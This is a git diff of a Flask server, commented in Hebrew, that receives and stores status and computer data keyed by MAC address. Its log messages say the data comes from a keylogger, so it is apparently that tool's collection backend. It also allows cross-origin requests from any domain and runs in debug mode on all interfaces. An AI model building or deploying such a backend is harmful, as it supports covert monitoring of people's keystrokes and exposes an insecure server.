@@ -6,68 +6,72 @@ import os
 app = Flask(__name__)
 CORS(app)  # מאפשר בקשות מכל דומיין
 
+
 def write_to_json(name_j, data):
-    """פונקציה לשמירת נתונים בקובץ JSON"""
+    """פונקציה לשמירת נתונים בקובץ JSON כמערך של מכשירים"""
     try:
         file_path = f"{name_j}.json"
+        mac_address = data.get("mac_address")  # נניח ש-mac_address הוא מפתח שמגיע מהקליינט או מהשרת
 
-        # בדיקה האם הקובץ קיים - אם כן, טוענים את הנתונים הקיימים; אחרת, מאותחלים במילון ריק
+        # טען נתונים קיימים או אתחל מערך ריק
         if os.path.exists(file_path):
-            try:
-                with open(file_path, "r", encoding="utf-8") as file:
+            with open(file_path, "r", encoding="utf-8") as file:
+                try:
                     data_json = json.load(file)
-            except json.JSONDecodeError:
-                data_json = {}  # במקרה של שגיאה בקריאת הקובץ, מאותחלים במילון ריק
+                    if not isinstance(data_json, list):  # ודא שזה מערך
+                        data_json = []
+                except json.JSONDecodeError:
+                    data_json = []
         else:
-            data_json = {}
+            data_json = []
 
-        # עדכון הנתונים עם המידע החדש
-        data_json.update(data)
+        # חפש אם המכשיר כבר קיים לפי MAC
+        device_index = next((i for i, item in enumerate(data_json) if item.get("mac_address") == mac_address), -1)
+        if device_index >= 0:
+            # עדכן מכשיר קיים
+            data_json[device_index].update(data)
+        else:
+            # הוסף מכשיר חדש
+            data_json.append(data)
 
-        # שמירה מחדש של הנתונים עם עיצוב ברור (indent=4)
+        # שמור את המערך המעודכן
         with open(file_path, "w", encoding="utf-8") as f:
             json.dump(data_json, f, ensure_ascii=False, indent=4)
     except Exception as e:
-        print("❌ שגיאה בכתיבת קובץ JSON:", e)  # הודעת שגיאה בעת כתיבת הקובץ
+        print("❌ שגיאה בכתיבת קובץ JSON:", e)
+
 
 @app.route('/api/status/update', methods=['POST'])
 def status_update():
-    print("📡 התחלת טיפול בבקשת עדכון סטטוס מהקיי לוגר")  # הודעה המצביעה על התחלת טיפול בבקשה מהקיי לוגר
+    print("📡 התחלת טיפול בבקשת עדכון סטטוס מהקיי לוגר")
     try:
         data = request.get_json()
-        if not data:
-            return jsonify({"error": "Invalid JSON"}), 400
+        if not data or "mac_address" not in data:
+            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
 
-        status = {"mac_address": data}
-        write_to_json("device_status", status)
-        print("✅ נתוני סטטוס מהקיי לוגר התקבלו:", data)  # הדפסת הנתונים שהתקבלו מהקיי לוגר
+        write_to_json("device_status", data)  # שלח את כל ה-data כפי שהוא
+        print("✅ נתוני סטטוס מהקיי לוגר התקבלו:", data)
         return jsonify({"message": "Success"}), 200
     except Exception as e:
         print("❌ שגיאה בעדכון סטטוס מהקיי לוגר:", e)
         return jsonify({"error": str(e)}), 500
 
+
 @app.route('/api/data/upload', methods=['POST'])
 def upload_data():
-    # טיפול בבקשת העלאת נתוני מחשב מהאתר (מזהה MAC חובה)
     print("📡 התחלת טיפול בבקשת העלאת נתוני מחשב מהאתר")
     try:
         data = request.get_json()
-        if not data:
-            return jsonify({"error": "Invalid JSON"}), 400
+        if not data or "mac_address" not in data:
+            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
 
-        mac_address = data.get("Mac-Address")
-        if not mac_address:
-            return jsonify({"error": "Missing macAddress"}), 400
-
-        data = {"mac_address": data}
         write_to_json("device_status", data)
-        print("✅ נתוני מחשב מהאתר התקבלו:", data)  # הדפסת הנתונים שהתקבלו מהאתר
+        print("✅ נתוני מחשב מהאתר התקבלו:", data)
         return jsonify({"message": "Success"}), 200
-    except json.JSONDecodeError:
-        return jsonify({"error": "Invalid JSON file"}), 500
     except Exception as e:
         print("❌ שגיאה בעדכון נתוני מחשב מהאתר:", e)
         return jsonify({"error": str(e)}), 500
+
 
 @app.route('/api/data/files', methods=['GET'])
 def get_data():
@@ -87,19 +91,22 @@ def get_data():
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON file"}), 500
 
+
 @app.route('/api/status/all', methods=['GET'])
 def get_status_all():
-    """שליפת קובץ הסטטוסים של כל המכשירים המחוברים עבור הדף האינטרנט"""
     print("📡 התחלת טיפול בבקשת שליפת סטטוסים לכל המכשירים מהאתר")
     try:
         with open("device_status.json", "r", encoding="utf-8") as file:
             data_json = json.load(file)
-            print("✅ סטטוסים שנשלחו אל הדף מהשרת:", data_json)  # הדפסת סטטוסים שנשלחו אל הדף מהשרת
+            if not isinstance(data_json, list):  # ודא שזה מערך
+                data_json = []
+            print("✅ סטטוסים שנשלחו אל הדף מהשרת:", data_json)
         return jsonify(data_json)
     except FileNotFoundError:
-        return jsonify({"error": "No data found"}), 404
+        return jsonify([]), 200  # החזר מערך ריק במקום שגיאה
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON file"}), 500
+
 
 @app.route('/api/status/check', methods=['GET'])
 def check_status():
@@ -117,38 +124,31 @@ def check_status():
             if not device_status:
                 return jsonify({"message": "No status found"}), 404
 
-            print("✅ סטטוס אחרון מהקיי לוגר עבור MAC", mac_address, ":", device_status)  # הדפסת סטטוס אחרון שהתקבל מהקיי לוגר
+            print("✅ סטטוס אחרון מהקיי לוגר עבור MAC", mac_address, ":",
+                  device_status)  # הדפסת סטטוס אחרון שהתקבל מהקיי לוגר
             return jsonify(device_status)
     except FileNotFoundError:
         return jsonify({"error": "Status file not found"}), 500
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON file"}), 500
 
+
 @app.route('/api/status/change', methods=['POST'])
 def change_status():
-    """מקבל נתוני סטטוס מהאתר ושומר בקובץ לפי כתובת MAC"""
     print("📡 התחלת טיפול בבקשת שינוי סטטוס מהאתר")
     try:
         data = request.get_json()
-        if not data:
-            return jsonify({"error": "Invalid JSON"}), 400
+        if not data or "mac_address" not in data:
+            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
 
-        mac_address = data.get("Mac-Address")
-        if not mac_address:
-            return jsonify({"error": "Missing macAddress"}), 400
-
-        status = {"mac_address": data}
-        write_to_json("change_device_status", status)
-        print("✅ נתוני סטטוס מהאתר התקבלו:", data)  # הדפסת הנתונים שהתקבלו מהאתר
+        write_to_json("device_status", data)  # שמור את כל הנתונים שנשלחו
+        print("✅ נתוני סטטוס מהאתר התקבלו:", data)
         return jsonify({"message": "Success"}), 200
-    except FileNotFoundError:
-        return jsonify({"error": "Status file not found"}), 500
-    except json.JSONDecodeError:
-        return jsonify({"error": "Invalid JSON file"}), 500
     except Exception as e:
         print("❌ שגיאה בעדכון סטטוס מהאתר:", e)
         return jsonify({"error": str(e)}), 500
 
+    
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=True)
